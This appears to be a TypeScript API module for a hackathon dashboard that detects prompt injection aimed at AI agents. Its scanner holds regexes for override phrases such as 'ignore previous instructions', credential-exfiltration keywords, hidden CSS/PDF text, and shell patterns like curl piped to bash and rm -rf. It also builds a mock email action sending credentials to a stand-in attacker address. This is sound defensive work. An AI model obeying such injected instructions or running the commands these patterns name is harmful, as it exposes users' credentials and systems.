import type { 
  SystemStats, 
  ProposedAction, 
  SecurityEventItem, 
  AgentSession, 
  SecurityPolicyConfig, 
  ScanResult,
  AttackVector,
  BackendActionCheckRequest,
  BackendActionCheckResponse,
  BackendHealthResponse
} from '../types';
import { 
  INITIAL_STATS, 
  INITIAL_APPROVALS, 
  INITIAL_SECURITY_EVENTS, 
  INITIAL_SESSIONS, 
  INITIAL_POLICIES 
} from './mockData';

// Backend Base URL defaults to http://localhost:8000
const BACKEND_BASE_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:8000';

// In-memory mock state for features awaiting backend implementation
let currentStats: SystemStats = { ...INITIAL_STATS };
let currentApprovals: ProposedAction[] = [...INITIAL_APPROVALS];
let currentEvents: SecurityEventItem[] = [...INITIAL_SECURITY_EVENTS];
let currentSessions: AgentSession[] = [...INITIAL_SESSIONS];
let currentPolicies: SecurityPolicyConfig = { ...INITIAL_POLICIES };

export const SentinelApi = {
  /**
   * Real Backend Check: GET /health
   * Queries Priyanshu's FastAPI health endpoint
   */
  async checkBackendHealth(): Promise<{ connected: boolean; data?: BackendHealthResponse; url: string }> {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 2000);
      const res = await fetch(`${BACKEND_BASE_URL}/health`, {
        signal: controller.signal
      });
      clearTimeout(timer);
      if (res.ok) {
        const data = await res.json();
        return { connected: true, data, url: BACKEND_BASE_URL };
      }
    } catch {
      // Backend offline or unreachable
    }
    return { connected: false, url: BACKEND_BASE_URL };
  },

  /**
   * Real Backend Action Check: POST /api/actions/check
   * Expected Request Shape:
   * {
   *   "tool": "summarize_email",
   *   "params": {
   *     "content": "Meeting tomorrow at 10 AM."
   *   }
   * }
   */
  async checkBackendAction(request: BackendActionCheckRequest): Promise<{
    attempted: boolean;
    connected: boolean;
    endpoint: string;
    requestPayload: BackendActionCheckRequest;
    response?: BackendActionCheckResponse;
    error?: string;
  }> {
    const endpoint = `${BACKEND_BASE_URL}/api/actions/check`;
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 3000);
      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(request),
        signal: controller.signal
      });
      clearTimeout(timer);

      if (res.ok) {
        const data = await res.json();
        return {
          attempted: true,
          connected: true,
          endpoint,
          requestPayload: request,
          response: data
        };
      } else {
        return {
          attempted: true,
          connected: false,
          endpoint,
          requestPayload: request,
          error: `Backend returned HTTP status ${res.status} ${res.statusText}`
        };
      }
    } catch (err: any) {
      return {
        attempted: true,
        connected: false,
        endpoint,
        requestPayload: request,
        error: `Could not reach ${endpoint}. Reason: ${err?.message || 'Connection refused / offline'}`
      };
    }
  },

  /**
   * MOCK MODE: Dashboard telemetry (Awaiting backend /api/stats)
   */
  async getSystemStats(): Promise<SystemStats> {
    return { ...currentStats, isSimulatedMock: true };
  },

  /**
   * MOCK MODE: Pending approvals (Awaiting backend /api/approvals)
   */
  async getPendingApprovals(): Promise<ProposedAction[]> {
    return [...currentApprovals];
  },

  /**
   * MOCK MODE: Local simulated approval state update
   * Note: Real approval authorization will be processed by backend policy engine once implemented
   */
  async respondToApproval(actionId: string, decision: 'APPROVE' | 'REJECT', notes?: string): Promise<ProposedAction> {
    const index = currentApprovals.findIndex(a => a.id === actionId);
    if (index === -1) {
      throw new Error(`Action with id ${actionId} not found`);
    }

    const targetAction = currentApprovals[index];
    const newStatus = decision === 'APPROVE' ? 'ALLOWED' : 'BLOCKED';

    const updatedAction: ProposedAction = {
      ...targetAction,
      status: newStatus,
      reviewedBy: 'Security Analyst (Palak)',
      reviewedAt: new Date().toLocaleTimeString(),
      isSimulatedMock: true
    };

    currentApprovals = currentApprovals.filter(a => a.id !== actionId);

    if (decision === 'APPROVE') {
      currentStats = {
        ...currentStats,
        pendingApprovals: Math.max(0, currentStats.pendingApprovals - 1),
        safeActionsExecuted: currentStats.safeActionsExecuted + 1
      };
    } else {
      currentStats = {
        ...currentStats,
        pendingApprovals: Math.max(0, currentStats.pendingApprovals - 1),
        injectionsBlocked: currentStats.injectionsBlocked + 1
      };
    }

    const newEvent: SecurityEventItem = {
      id: `evt-${Date.now().toString().slice(-4)}`,
      timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19),
      type: decision === 'APPROVE' ? 'SYSTEM_ALERT' : 'POLICY_VIOLATION',
      severity: targetAction.riskLevel,
      vector: targetAction.sourceContext.vector,
      title: decision === 'APPROVE' ? `Analyst Approved: ${targetAction.toolName}` : `Analyst Blocked: ${targetAction.toolName}`,
      description: `[MOCK SIMULATION] Action ${targetAction.id} was manually ${decision.toLowerCase()}d. Notes: ${notes || 'No notes provided'}.`,
      payloadSample: JSON.stringify(targetAction.parameters, null, 2),
      source: targetAction.sourceContext.sourceName,
      blocked: decision === 'REJECT',
      mitigation: decision === 'REJECT' ? 'Deterministic execution barrier held. Tool call dropped.' : 'Manual security override authorized execution.',
      isSimulatedMock: true
    };
    currentEvents = [newEvent, ...currentEvents];

    return updatedAction;
  },

  /**
   * MOCK MODE: Incident logs (Awaiting backend /api/events)
   */
  async getSecurityEvents(): Promise<SecurityEventItem[]> {
    return [...currentEvents];
  },

  /**
   * MOCK MODE: Active agent sessions (Awaiting backend /api/tasks or /api/agents)
   */
  async getAgentSessions(): Promise<AgentSession[]> {
    return [...currentSessions];
  },

  /**
   * Policy configurations
   */
  async getPolicies(): Promise<SecurityPolicyConfig> {
    return { ...currentPolicies };
  },

  async updatePolicies(updates: Partial<SecurityPolicyConfig>): Promise<SecurityPolicyConfig> {
    currentPolicies = { ...currentPolicies, ...updates };
    return { ...currentPolicies };
  },

  /**
   * Scan Input Vector:
   * 1. Submits real check to POST /api/actions/check (Priyanshu's backend)
   * 2. Separately executes client-side simulated threat heuristics for hackathon demonstration
   * 3. Distinctly labels real backend decision vs simulated analysis
   */
  async scanInput(vector: AttackVector, content: string, sourceTitle: string): Promise<ScanResult> {
    const startTime = performance.now();

    // Map input to appropriate tool check for the real backend
    let defaultTool = 'summarize_email';
    if (vector === 'WEB') defaultTool = 'scrape_webpage';
    if (vector === 'PDF') defaultTool = 'parse_pdf_document';

    const backendPayload: BackendActionCheckRequest = {
      tool: defaultTool,
      params: {
        content: content.slice(0, 1000)
      }
    };

    // Attempt actual backend check
    const realBackendResult = await this.checkBackendAction(backendPayload);

    // Run client-side heuristic inspection (Clearly designated as simulation)
    const threatsFound: string[] = [];
    const injectionsDetected = [];
    let simulatedProposedAction: ProposedAction | undefined = undefined;

    const lower = content.toLowerCase();

    // 1. Detect Direct Prompt Override Patterns
    const overrideRegex = /(system\s*(override|instruction|directive)|ignore\s*(all|previous|prior)\s*(instructions|rules|constraints)|disregard\s*(all|prior|previous)|you\s*are\s*now\s*in\s*emergency)/i;
    const overrideMatch = content.match(overrideRegex);
    if (overrideMatch) {
      threatsFound.push('Prompt Override / Jailbreak Directive');
      injectionsDetected.push({
        id: `inj-${Date.now()}-1`,
        location: `Index ${overrideMatch.index || 0}`,
        pattern: overrideMatch[0],
        confidence: 0.98,
        rawText: overrideMatch[0],
        intent: 'Attempting to commandeer LLM reasoning instructions and wipe system guardrails.'
      });
    }

    // 2. Detect Exfiltration Directives
    const exfilRegex = /(send_email|forward|transmit|exfil|credentials|api_key|token|password|\.aws|\.env|webhook)/i;
    const exfilMatch = content.match(exfilRegex);
    if (exfilMatch && (overrideMatch || lower.includes('attacker') || lower.includes('external'))) {
      threatsFound.push('Credential Exfiltration Signature');
      injectionsDetected.push({
        id: `inj-${Date.now()}-2`,
        location: 'Payload Body',
        pattern: exfilMatch[0],
        confidence: 0.95,
        rawText: exfilMatch[0],
        intent: 'Directing agent to read sensitive local credentials and transmit externally.'
      });

      simulatedProposedAction = {
        id: `act-sim-${Date.now()}`,
        timestamp: 'Just now',
        toolName: 'send_email',
        parameters: {
          recipient: 'attacker@exfil-recon.net',
          data: 'Extracted credential tokens'
        },
        riskLevel: 'CRITICAL',
        status: 'PENDING_APPROVAL',
        targetResource: 'External Network Egress',
        reasoning: '[SIMULATED LLM REASONING]: Input content requested transmission of local credential files.',
        policyViolation: 'POLICY_DATA_EXFILTRATION: Egress to non-allowlisted external endpoint prevented.',
        isSimulatedMock: true,
        sourceContext: {
          vector,
          sourceName: sourceTitle,
          snippet: content.slice(0, 150)
        }
      };
    }

    // 3. Detect Hidden HTML / CSS Steganography
    const hiddenCssRegex = /(display\s*:\s*none|font-size\s*:\s*0|opacity\s*:\s*0|visibility\s*:\s*hidden|color\s*:\s*transparent)/i;
    const hiddenMatch = content.match(hiddenCssRegex);
    if (hiddenMatch) {
      threatsFound.push('Steganographic Hidden Font / Zero-Size Text');
      injectionsDetected.push({
        id: `inj-${Date.now()}-3`,
        location: 'CSS Styling Attribute',
        pattern: hiddenMatch[0],
        confidence: 0.99,
        rawText: hiddenMatch[0],
        intent: 'Hiding prompt injection commands from human readers while exposing them to the LLM token stream.'
      });
    }

    // 4. Detect Arbitrary System Execution Patterns
    const execRegex = /(curl\s+.*\|\s*(bash|sh)|execute_bash|sudo\s+systemctl|rm\s+-rf|chmod\s+\+x)/i;
    const execMatch = content.match(execRegex);
    if (execMatch) {
      threatsFound.push('Arbitrary Shell Execution Payload');
      injectionsDetected.push({
        id: `inj-${Date.now()}-4`,
        location: 'Code Block / Inline Command',
        pattern: execMatch[0],
        confidence: 0.97,
        rawText: execMatch[0],
        intent: 'Attempting to execute remote shell script on host operating system.'
      });

      simulatedProposedAction = {
        id: `act-sim-exec-${Date.now()}`,
        timestamp: 'Just now',
        toolName: 'execute_bash_command',
        parameters: {
          command: execMatch[0]
        },
        riskLevel: 'CRITICAL',
        status: 'BLOCKED',
        targetResource: 'Host Shell / OS Runtime',
        reasoning: '[SIMULATED LLM REASONING]: Input requested terminal command execution.',
        policyViolation: 'POLICY_UNAUTHORIZED_SHELL: Terminal execution prohibited by deterministic policy.',
        isSimulatedMock: true,
        sourceContext: {
          vector,
          sourceName: sourceTitle,
          snippet: execMatch[0]
        }
      };
    }

    // 5. Detect PDF White Font / Hidden Layer
    const pdfHiddenRegex = /(1 1 1 rg|0 0 0 0 k|hidden layer|xmp-prompt)/i;
    if (vector === 'PDF' && content.match(pdfHiddenRegex)) {
      threatsFound.push('PDF Low-Contrast / White-on-White Layer');
      injectionsDetected.push({
        id: `inj-${Date.now()}-5`,
        location: 'PDF Stream BT/ET Block',
        pattern: '1 1 1 rg (White fill on white page)',
        confidence: 0.96,
        rawText: '1 1 1 rg instruction stream',
        intent: 'Invisible text layer designed to override document summarization.'
      });
    }

    const isClean = threatsFound.length === 0;
    const simulatedRiskScore = isClean ? 4 : Math.min(99, 45 + threatsFound.length * 18);

    const sanitized = content
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '[SANITIZED_SCRIPT]')
      .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '[SANITIZED_STYLE]')
      .replace(/style="[^"]*display\s*:\s*none[^"]*"/gi, 'style="border: 2px solid #ef4444;"')
      .replace(/style="[^"]*font-size\s*:\s*0[^"]*"/gi, 'style="font-size: 14px; color: #f87171;"');

    // Update in-memory telemetry simulation
    currentStats = {
      ...currentStats,
      totalScanned: currentStats.totalScanned + 1,
      injectionsBlocked: isClean ? currentStats.injectionsBlocked : currentStats.injectionsBlocked + 1,
      pendingApprovals: currentStats.pendingApprovals + (simulatedProposedAction?.status === 'PENDING_APPROVAL' ? 1 : 0)
    };

    if (simulatedProposedAction && simulatedProposedAction.status === 'PENDING_APPROVAL') {
      currentApprovals = [simulatedProposedAction, ...currentApprovals];
    }

    const elapsed = Math.round(performance.now() - startTime + 70);

    const result: ScanResult = {
      id: `scan-${Date.now().toString().slice(-6)}`,
      timestamp: new Date().toLocaleTimeString(),
      vector,
      sourceTitle,
      rawContent: content,
      processingTimeMs: elapsed,
      realBackend: realBackendResult,
      simulatedAnalysis: {
        isClean,
        threatsFound,
        injectionsDetected,
        simulatedRiskScore,
        sanitizedContent: sanitized,
        simulatedProposedAction
      }
    };

    return result;
  }
};
